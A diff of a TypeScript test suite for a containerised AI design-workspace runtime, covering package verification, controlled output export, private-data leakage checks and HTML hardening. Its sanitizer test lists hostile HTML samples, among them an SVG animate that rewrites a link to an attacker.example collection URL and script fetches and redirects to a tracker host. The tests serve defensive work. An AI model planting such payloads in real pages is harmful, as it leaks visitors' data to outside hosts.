@@ -12,7 +12,9 @@ import {
   MAP_DESIGN_WORKSPACE_SCHEMA,
   buildGeneratedArtifactFiles,
   canAcceptUntrackedWorkspaceEdit,
+  computePublicArtifactRevision,
   hardenSelfContainedHtml,
+  normalizeGeneratedHtml,
   normalizeWorkspaceTransfer,
 } from '../../src/services/agent-workspace-session-runtime.js';
 import type { ExecOptions, ExecResult, IShellExecutor } from '../../src/types.js';
@@ -61,7 +63,7 @@ class RecordingShell implements IShellExecutor {
   failTemplateInit = false;
   volumeCleanupFailures = 0;
   egressCleanupFailures = 0;
-  outputPreflightFailure: 'total_bytes' | 'file_count' | 'workspace_file_count' | 'node_count' | 'directory_depth' | 'special_file' | 'path_not_allowed' | null = null;
+  outputPreflightFailure: 'total_bytes' | 'file_count' | 'workspace_file_count' | 'node_count' | 'directory_depth' | 'special_file' | 'path_not_allowed' | 'input_changed' | 'file_changed' | null = null;
   returnNoSuchForRepeatedCleanup = false;
   failStorageCapability = false;
 
@@ -109,6 +111,23 @@ class RecordingShell implements IShellExecutor {
     if (command.startsWith('docker run --detach') && this.failEgressRun) {
       return result('', 'relay process failed after allocation', 125);
     }
+    if (command.startsWith('docker run ') && command.includes('CDS_OUTPUT_PREFLIGHT=1')) {
+      if (this.outputPreflightFailure) {
+        const rejectedPath = this.outputPreflightFailure === 'path_not_allowed'
+          ? `:${Buffer.from('unexpected/runtime-state.json').toString('base64url')}`
+          : '';
+        return result('', `CDS_OUTPUT_PREFLIGHT:${this.outputPreflightFailure}${rejectedPath}`, 1);
+      }
+      const outputDir = command.match(/type=bind,src=([^,']+),dst=\/cds-output/)?.[1];
+      if (outputDir && this.workspaceDir) {
+        for (const relative of ['index.html', 'manifest.json', 'assets']) {
+          const source = path.join(this.workspaceDir, relative);
+          if (!fs.existsSync(source)) continue;
+          fs.cpSync(source, path.join(outputDir, relative), { recursive: true });
+        }
+      }
+      return result('exported\n');
+    }
     if (command.startsWith('docker run ')) {
       if (this.failVolumeInit && command.includes('--cap-add CHOWN')) {
         return result('', `${'volume init denied '.repeat(256)}\n`, 126);
@@ -120,12 +139,6 @@ class RecordingShell implements IShellExecutor {
       return this.failEgressConnect ? result('', 'connect denied', 1) : result('connected\n');
     }
     if (command.startsWith('docker exec ')) {
-      if (command.includes('CDS_OUTPUT_PREFLIGHT=1') && this.outputPreflightFailure) {
-        const rejectedPath = this.outputPreflightFailure === 'path_not_allowed'
-          ? `:${Buffer.from('unexpected/runtime-state.json').toString('base64url')}`
-          : '';
-        return result('', `CDS_OUTPUT_PREFLIGHT:${this.outputPreflightFailure}${rejectedPath}`, 1);
-      }
       if (this.failTemplateInit && command.includes('design-templates/web-prototype')) {
         return result('', 'web prototype resources missing', 1);
       }
@@ -171,8 +184,10 @@ class RecordingShell implements IShellExecutor {
 
 function buildPackage(
   files: Array<{ path: string; content: string; mediaType: string }>,
-  options: { injectDefaultTask?: boolean } = {},
+  options: { injectDefaultTask?: boolean; runId?: string; baseRevision?: string } = {},
 ) {
+  const runId = options.runId ?? 'map-run-1';
+  const baseRevision = options.baseRevision ?? 'rev-1';
   const hasCurrentPage = files.some((file) => file.path === 'current/index.html');
   const normalizedFiles = options.injectDefaultTask === false || files.some((file) => file.path === 'brief/task.json')
     ? files
@@ -181,17 +196,40 @@ function buildPackage(
           path: 'brief/task.json',
           content: JSON.stringify({
             schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
-            runId: 'map-run-1',
+            runId,
             operation: hasCurrentPage ? 'edit' : 'generate',
-            instruction: 'Build a launch page',
+            input: {
+              userSupplied: {
+                instruction: 'Build a launch page',
+                contentHash: null,
+                authority: 'user-supplied',
+              },
+              serverKnowledge: {
+                authority: 'server-authoritative-snapshot',
+                references: files.filter((file) => file.path.startsWith('knowledge/')).map((file) => ({
+                  entryId: file.path,
+                  storeId: null,
+                  contentHash: digest(Buffer.from(file.content)),
+                })),
+              },
+              currentHtml: hasCurrentPage
+                ? {
+                    authority: 'server-owned-current-artifact',
+                    contentHash: digest(Buffer.from(files.find((file) => file.path === 'current/index.html')!.content)),
+                  }
+                : null,
+            },
+            inputAuthority: 'user-supplied',
             title: 'Launch page',
-            baseRevision: 'rev-1',
+            baseRevision,
             responseContract: { requiredFile: 'index.html', manifestFile: 'manifest.json', writeback: 'external' },
             qualityContract: {
               schemaVersion: 'map-design-artifact-quality-v1',
-              factualSources: hasCurrentPage
-                ? ['title', 'instruction', 'knowledge', 'current-visible-content']
-                : ['title', 'instruction', 'knowledge'],
+              factualSources: [
+                ...(files.some((file) => file.path.startsWith('knowledge/')) ? ['server-knowledge'] : []),
+                ...(hasCurrentPage ? ['server-current-visible-content'] : []),
+              ],
+              userSuppliedInputsAreFactualProvenance: false,
               measuredClaimsRequireSource: true,
               sensitiveFactsRequireSource: true,
               contextBoundMetricsReviewRequired: true,
@@ -208,8 +246,8 @@ function buildPackage(
       ];
   const body = {
     schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
-    runId: 'map-run-1',
-    baseRevision: 'rev-1',
+    runId,
+    baseRevision,
     files: normalizedFiles.map((file) => {
       const bytes = Buffer.from(file.content);
       return {
@@ -420,6 +458,47 @@ describe('AgentWorkspaceSessionRuntime', () => {
     expect(fs.readdirSync(rootDir)).toEqual([]);
   });
 
+  it('accepts the shared C# task contract fixture before allocating the OpenDesign runtime', async () => {
+    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
+    const task = fs.readFileSync(path.resolve('../scripts/fixtures/opendesign-task-v1.json'), 'utf8').trim();
+    const workspacePackage = buildPackage([
+      { path: 'brief/task.json', content: task, mediaType: 'application/json' },
+      { path: 'knowledge/01-product.md', content: '# 产品 资料\n\n产品定位与核心卖点', mediaType: 'text/markdown' },
+      { path: 'current/index.html', content: '<!doctype html><html><body>旧页面</body></html>', mediaType: 'text/html' },
+    ], {
+      injectDefaultTask: false,
+      runId: 'run-workspace-1',
+      baseRevision: 'f8d4db0e6f79e6607ae38e7fd2624b8454fc0a84df3e0246476868bc77dbb493',
+    });
+    const shell = new RecordingShell();
+    const runtime = new AgentWorkspaceSessionRuntime(shell, {
+      rootDir,
+      capabilityCacheMs: 0,
+      containerUid: process.getuid?.() ?? 1001,
+      containerGid: process.getgid?.() ?? 1001,
+      fetchImpl: async () => new Response(workspacePackage.serialized, { status: 200 }),
+    });
+
+    await expect(runtime.create('session-golden-contract', {
+      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
+      inputPackageUrl: 'https://map.example.test/input',
+      resultCommitUrl: 'https://map.example.test/commit',
+      transferToken: 'transfer-token',
+      inputSha256: workspacePackage.sha256,
+      baseRevision: 'f8d4db0e6f79e6607ae38e7fd2624b8454fc0a84df3e0246476868bc77dbb493',
+      maxInputBytes: 1024 * 1024,
+      maxOutputBytes: 1024,
+      allowedOutputPaths: ['index.html', 'manifest.json'],
+    }, {
+      cpuCores: 1,
+      memoryMb: 768,
+      timeoutSeconds: 30,
+      networkPolicy: 'egress-only',
+      autoCleanupMinutes: 5,
+    })).resolves.toMatchObject({ containerName: expect.stringMatching(/^cds-od-/) });
+    await runtime.stop('session-golden-contract', 'test_complete');
+  });
+
   it('materializes a verified package, runs an isolated OpenDesign container, and commits only allowed outputs', async () => {
     rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
     const workspacePackage = buildPackage([
@@ -590,15 +669,17 @@ describe('AgentWorkspaceSessionRuntime', () => {
     });
     const preflightIndex = shell.calls.findIndex((call) => call.command.includes('CDS_OUTPUT_PREFLIGHT=1'));
     const preflightCommand = shell.calls[preflightIndex]?.command || '';
-    const outboundCopyIndex = shell.calls.findIndex((call) => (
-      call.command.startsWith('docker cp ') && call.command.includes(':/workspace/.')
-    ));
+    const pauseIndex = shell.calls.findIndex((call) => call.command.startsWith('docker pause '));
+    const unpauseIndex = shell.calls.findIndex((call) => call.command.startsWith('docker unpause '));
     expect(preflightIndex).toBeGreaterThan(-1);
-    expect(outboundCopyIndex).toBeGreaterThan(preflightIndex);
+    expect(pauseIndex).toBeGreaterThan(-1);
+    expect(preflightIndex).toBeGreaterThan(pauseIndex);
+    expect(unpauseIndex).toBeGreaterThan(preflightIndex);
     expect(shell.calls[preflightIndex]?.options?.timeout).toBeGreaterThan(0);
     expect(shell.calls[preflightIndex]?.options?.timeout).toBeLessThanOrEqual(30_000);
-    expect(shell.calls[outboundCopyIndex]?.options?.timeout).toBeGreaterThan(0);
-    expect(shell.calls[outboundCopyIndex]?.options?.timeout).toBeLessThanOrEqual(30_000);
+    expect(preflightCommand).toContain('dst=/workspace,readonly');
+    expect(preflightCommand).toContain('dst=/cds-output');
+    expect(shell.calls.some((call) => call.command.startsWith('docker cp ') && call.command.includes(':/workspace/.'))).toBe(false);
     expect(preflightCommand).toContain('special_file');
     expect(preflightCommand).toContain('file_count');
     expect(preflightCommand).toContain('total_bytes');
@@ -606,7 +687,12 @@ describe('AgentWorkspaceSessionRuntime', () => {
     const encodedPreflightConfig = preflightCommand.match(/CDS_OUTPUT_PREFLIGHT_CONFIG=([A-Za-z0-9+/=]+)/)?.[1] || '';
     expect(JSON.parse(Buffer.from(encodedPreflightConfig, 'base64').toString('utf8'))).toEqual({
       allowedOutputPaths: ['index.html', 'manifest.json', 'assets/**'],
-      inputPaths: ['brief/task.json', 'knowledge/source.md', 'brief.txt', 'current/index.html'],
+      inputFiles: expect.arrayContaining([
+        expect.objectContaining({ path: 'brief/task.json', size: expect.any(Number), sha256: expect.any(String) }),
+        expect.objectContaining({ path: 'knowledge/source.md', size: expect.any(Number), sha256: expect.any(String) }),
+        expect.objectContaining({ path: 'brief.txt', size: expect.any(Number), sha256: expect.any(String) }),
+        expect.objectContaining({ path: 'current/index.html', size: expect.any(Number), sha256: expect.any(String) }),
+      ]),
       ignoredRuntimePaths: ['index.html.artifact.json'],
       maxFileCount: 100,
       maxWorkspaceFileCount: 1024,
@@ -871,8 +957,8 @@ describe('AgentWorkspaceSessionRuntime', () => {
     ]);
     const committedManifest = committed?.body.files.find((file: any) => file.path === 'manifest.json');
     expect(JSON.parse(Buffer.from(committedManifest.contentBase64, 'base64').toString('utf8'))).toEqual({
-      schemaVersion: 'map-design-artifact-manifest-v1',
-      baseRevision: 'rev-1',
+      schemaVersion: 'map-design-artifact-public-manifest-v2',
+      artifactRevision: expect.stringMatching(/^[a-f0-9]{64}$/),
       entryFile: 'index.html',
       files: [
         expect.objectContaining({ path: 'assets/app.css' }),
@@ -1012,6 +1098,8 @@ describe('AgentWorkspaceSessionRuntime', () => {
     expect(provenanceText).not.toContain('Private knowledge body');
     expect(provenanceText).not.toContain('knowledge/source.md');
     expect(provenanceText).not.toContain(workspacePackage.sha256);
+    expect(provenanceText).not.toContain('knowledgeSourceCount');
+    expect(provenanceText).not.toContain('sourceClasses');
     expect(fs.existsSync(path.join(rootDir, 'session-generate', 'workspace', 'current', 'index.html'))).toBe(false);
     await runtime.stop('session-generate');
   });
@@ -1019,8 +1107,8 @@ describe('AgentWorkspaceSessionRuntime', () => {
   it('derives stable public metadata from the hardened page without leaking private provenance', () => {
     const html = '<!doctype html><html lang="zh-CN"><head><title>产品说明</title><style>:root{--brand:#123456;--space:16px}body{font-family:Inter, sans-serif}@media(max-width:720px){main{padding:8px}}</style></head><body><header></header><main><h1 id="top">产品说明</h1><h2>核心能力</h2><img src="data:image/png;base64,AA==" alt="示意图"><a href="#top">返回</a></main><footer></footer></body></html>';
 
-    const first = buildGeneratedArtifactFiles(html, { knowledgeSourceCount: 2 });
-    const second = buildGeneratedArtifactFiles(html, { knowledgeSourceCount: 2 });
+    const first = buildGeneratedArtifactFiles(html);
+    const second = buildGeneratedArtifactFiles(html);
 
     expect(second).toEqual(first);
     const decoded = Object.fromEntries(first.map((file) => [
@@ -1042,10 +1130,198 @@ describe('AgentWorkspaceSessionRuntime', () => {
       landmarks: { header: 1, main: 1, footer: 1 },
     });
     const provenance = JSON.stringify(decoded['assets/provenance.json']);
-    expect(provenance).toContain('"knowledgeSourceCount":2');
+    expect(provenance).toContain('"publicInput":"hardened-index-html"');
     expect(provenance).not.toContain('entryId');
     expect(provenance).not.toContain('objectKey');
     expect(provenance).not.toContain('sha256');
+  });
+
+  it('commits a byte-identical public six-file package for different private workspace inputs', async () => {
+    const finalHtml = '<!doctype html><html><head><title>公开页面</title></head><body><main><h1>公开页面</h1><p>同一公开内容</p></main></body></html>';
+    const runOnce = async (suffix: string, baseRevision: string, privateFiles: Array<{ path: string; content: string; mediaType: string }>) => {
+      const runId = `map-private-${suffix}`;
+      const sessionId = `session-private-${suffix}`;
+      const packageRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-private-'));
+      rootDir = packageRoot;
+      const inputPackage = buildPackage(privateFiles, { runId, baseRevision });
+      let committedPackage: any;
+      let runCreates = 0;
+      const shell = new RecordingShell();
+      const runtime = new AgentWorkspaceSessionRuntime(shell, {
+        rootDir: packageRoot,
+        instanceId: `instance-private-${suffix}`,
+        daemonPort: 7456,
+        pollIntervalMs: 1,
+        capabilityCacheMs: 0,
+        containerUid: process.getuid?.() ?? 1001,
+        containerGid: process.getgid?.() ?? 1001,
+        fetchImpl: async (input, init) => {
+          const url = new URL(typeof input === 'string' ? input : input instanceof URL ? input : input.url);
+          if (url.pathname === '/input') return new Response(inputPackage.serialized, { status: 200 });
+          if (url.pathname === '/api/health') return Response.json({ ok: true });
+          if (url.pathname === '/api/import/folder') {
+            return Response.json({
+              project: { id: `od-private-${suffix}`, skillId: 'web-prototype' },
+              conversationId: `od-private-conversation-${suffix}`,
+            });
+          }
+          if (url.pathname === '/api/runs' && init?.method === 'POST') {
+            runCreates += 1;
+            fs.writeFileSync(path.join(shell.workspaceDir, 'index.html'), finalHtml);
+            return Response.json({ runId: `od-private-${suffix}-${runCreates}` }, { status: 202 });
+          }
+          if (url.pathname.startsWith(`/api/runs/od-private-${suffix}-`)) {
+            return Response.json(runCreates === 1
+              ? { status: 'succeeded', deliverableValid: true }
+              : { status: 'succeeded', deliverableValid: false, deliverableValidation: 'no_artifact' });
+          }
+          if (url.pathname === '/commit') {
+            committedPackage = JSON.parse(typeof init?.body === 'string' ? init.body : '');
+            return Response.json({ artifactRef: `artifact:private-${suffix}`, resultSha256: digest(JSON.stringify(committedPackage)) });
+          }
+          if (url.pathname.endsWith('/cancel')) return Response.json({});
+          return new Response('', { status: 404 });
+        },
+      });
+      await runtime.create(sessionId, {
+        schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
+        inputPackageUrl: 'https://map.example.test/input',
+        resultCommitUrl: 'https://map.example.test/commit',
+        transferToken: `transfer-token-${suffix}`,
+        inputSha256: inputPackage.sha256,
+        baseRevision,
+        maxInputBytes: 1024 * 1024,
+        maxOutputBytes: 1024 * 1024,
+        allowedOutputPaths: ['index.html', 'manifest.json', 'assets/**'],
+      }, {
+        cpuCores: 1,
+        memoryMb: 768,
+        timeoutSeconds: 30,
+        networkPolicy: 'egress-only',
+        autoCleanupMinutes: 5,
+      });
+      try {
+        await runtime.execute(sessionId, '生成公开页面。', {
+          baseUrl: `https://map.example.test/api/design-artifacts/runtime/${runId}/llm/v1`,
+          protocol: 'openai',
+          apiKey: `model-secret-${suffix}`,
+          model: 'map-managed',
+        }, `transfer-token-${suffix}`);
+      } finally {
+        await runtime.stop(sessionId);
+      }
+      return { inputPackage, committedPackage };
+    };
+
+    const first = await runOnce('a', 'private-base-revision-a', [
+      { path: 'knowledge/private-entry-a.md', content: '同一公开内容\n仅第一份私有知识', mediaType: 'text/markdown' },
+    ]);
+    const second = await runOnce('b', 'private-base-revision-b', [
+      { path: 'knowledge/private-entry-b.md', content: '同一公开内容\n仅第二份私有知识', mediaType: 'text/markdown' },
+      { path: 'knowledge/private-entry-c.md', content: '额外私有知识', mediaType: 'text/markdown' },
+    ]);
+
+    expect(first.inputPackage.sha256).not.toBe(second.inputPackage.sha256);
+    expect(first.committedPackage.baseRevision).toBe('private-base-revision-a');
+    expect(second.committedPackage.baseRevision).toBe('private-base-revision-b');
+    expect(first.committedPackage.files.map((file: any) => file.path)).toEqual([
+      'assets/accessibility-static-report.json',
+      'assets/design-tokens.json',
+      'assets/page-outline.json',
+      'assets/provenance.json',
+      'index.html',
+      'manifest.json',
+    ]);
+    expect(second.committedPackage.files.map((file: any) => file.path)).toEqual(
+      first.committedPackage.files.map((file: any) => file.path),
+    );
+    for (let index = 0; index < first.committedPackage.files.length; index += 1) {
+      const firstFile = first.committedPackage.files[index];
+      const secondFile = second.committedPackage.files[index];
+      expect(secondFile).toEqual(firstFile);
+      expect(Buffer.from(secondFile.contentBase64, 'base64').equals(
+        Buffer.from(firstFile.contentBase64, 'base64'),
+      )).toBe(true);
+    }
+    const serialized = JSON.stringify(first.committedPackage.files);
+    expect(serialized).not.toContain('private-base-revision');
+    expect(serialized).not.toContain('private-entry');
+    expect(serialized).not.toContain('私有知识');
+  });
+
+  it('uses the same public artifact revision golden vector as MAP', () => {
+    expect(computePublicArtifactRevision([{
+      path: 'index.html',
+      contentBase64: '',
+      sha256: 'a'.repeat(64),
+      size: 123,
+      mediaType: 'text/html; charset=utf-8',
+    }])).toBe('682a9da217538a26e9451dd11888ae0ceef1fe807e7728c3c0b840536700de61');
+  });
+
+  it('derives outline and accessibility only from non-inert visible document contexts', () => {
+    const html = `<!doctype html><html lang="zh-CN"><head><title>真实标题</title><style>.fake{display:none}</style></head><body>
+      <template><h1 id="template-secret">模板秘密</h1><button>模板按钮</button></template>
+      <section hidden><h2>隐藏标题</h2><a href="#real">隐藏链接</a></section>
+      <section aria-hidden="true"><img src="data:image/png;base64,AA=="><button>无障碍隐藏按钮</button></section>
+      <section style="display:none"><h3>样式隐藏标题</h3></section>
+      <textarea><h4>文本域伪标签</h4><button>文本域伪按钮</button></textarea>
+      <main><h1 id="real">真实标题</h1><img src="data:image/png;base64,AA==" alt="真实图"><a href="#real">真实链接</a></main>
+    </body></html>`;
+    const decoded = Object.fromEntries(buildGeneratedArtifactFiles(html).map((file) => [
+      file.path,
+      JSON.parse(Buffer.from(file.contentBase64, 'base64').toString('utf8')),
+    ]));
+
+    expect(decoded['assets/page-outline.json']).toMatchObject({
+      title: '真实标题',
+      headings: [{ level: 1, text: '真实标题', id: 'real' }],
+    });
+    expect(decoded['assets/accessibility-static-report.json']).toMatchObject({
+      document: { headingCount: 1, hasSingleH1: true },
+      images: { count: 1, missingAltCount: 0 },
+      controls: { linkCount: 1, buttonCount: 0 },
+      landmarks: { main: 1 },
+    });
+    expect(JSON.stringify(decoded)).not.toContain('模板秘密');
+    expect(JSON.stringify(decoded)).not.toContain('隐藏标题');
+    expect(JSON.stringify(decoded)).not.toContain('文本域伪标签');
+  });
+
+  it('keeps derivation memory bounded for a near-limit document with hundreds of thousands of tags', () => {
+    const repeated = '<span>x</span>'.repeat(420_000);
+    const html = `<!doctype html><html lang="zh-CN"><head><title>大页面</title></head><body><main><h1>大页面</h1>${repeated}</main></body></html>`;
+    expect(Buffer.byteLength(html)).toBeGreaterThan(5_500_000);
+    expect(Buffer.byteLength(html)).toBeLessThan(6_291_456);
+    const heapBefore = process.memoryUsage().heapUsed;
+
+    const hardened = hardenSelfContainedHtml(html);
+    const files = buildGeneratedArtifactFiles(hardened);
+    const heapGrowth = process.memoryUsage().heapUsed - heapBefore;
+
+    expect(hardened).toContain('Content-Security-Policy');
+    expect(files.reduce((total, file) => total + file.size, 0)).toBeLessThan(100_000);
+    expect(heapGrowth).toBeLessThan(64 * 1024 * 1024);
+  }, 30_000);
+
+  it('matches the shared generated HTML normalization and hardening golden vectors', () => {
+    const fixture = JSON.parse(fs.readFileSync(
+      path.resolve(process.cwd(), '../scripts/fixtures/generated-html-normalization-v1.json'),
+      'utf8',
+    )) as {
+      csp: string;
+      vectors: Array<{ input: string; normalized: string; hardenedSha256: string }>;
+    };
+    expect(fixture.csp).toBe([
+      "default-src 'none'", "base-uri 'none'", "connect-src 'none'", "form-action 'none'",
+      'img-src data:', 'font-src data:', 'media-src data:', "style-src 'unsafe-inline'",
+      "script-src 'none'", "object-src 'none'", "frame-src 'none'", "child-src 'none'",
+      "worker-src 'none'", "manifest-src 'none'",
+    ].join('; '));
+    for (const vector of fixture.vectors) {
+      expect(normalizeGeneratedHtml(vector.input)).toBe(vector.normalized);
+      expect(digest(hardenSelfContainedHtml(vector.input))).toBe(vector.hardenedSha256);
+    }
   });
 
   it.each([
@@ -1270,7 +1546,7 @@ describe('AgentWorkspaceSessionRuntime', () => {
       transferToken: 'transfer-token',
       inputSha256: workspacePackage.sha256,
       baseRevision: 'rev-1',
-      maxInputBytes: 1024,
+      maxInputBytes: 4096,
       maxOutputBytes: 1024,
       allowedOutputPaths: ['index.html', 'manifest.json'],
     }, {
@@ -1786,7 +2062,9 @@ describe('AgentWorkspaceSessionRuntime', () => {
     ['directory_depth', 'design_output_invalid'],
     ['special_file', 'design_output_invalid'],
     ['path_not_allowed', 'design_output_invalid'],
-  ] as const)('rejects container output preflight failure %s before docker cp', async (failure, expectedCode) => {
+    ['input_changed', 'workspace_input_changed'],
+    ['file_changed', 'design_output_invalid'],
+  ] as const)('rejects frozen controlled-export failure %s without copying the workspace tree', async (failure, expectedCode) => {
     rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
     const workspacePackage = buildPackage([
       { path: 'index.html', content: '<!doctype html><html><body>Draft</body></html>', mediaType: 'text/html' },
@@ -2299,6 +2577,7 @@ describe('AgentWorkspaceSessionRuntime', () => {
       '<!doctype html><html><body background="https://tracker.example/pixel.png"></body></html>',
       '<!doctype html><html><video poster="https://tracker.example/poster.png"></video></html>',
       '<!doctype html><html><a href="#ok" ping="https://tracker.example/ping">leave</a></html>',
+      '<!doctype html><html><body><svg><a href="#ok"><animate attributeName="href" values="https://attacker.example/collect" dur="1ms" fill="freeze"/><text>continue</text></a></svg><div id="ok">ok</div></body></html>',
       '<!doctype html><html><style>@import "https://tracker.example/a.css";</style></html>',
       '<!doctype html><html><script>fetch("https://tracker.example/data")</script></html>',
       '<!doctype html><html><script>window.location.href="https://tracker.example/out"</script></html>',
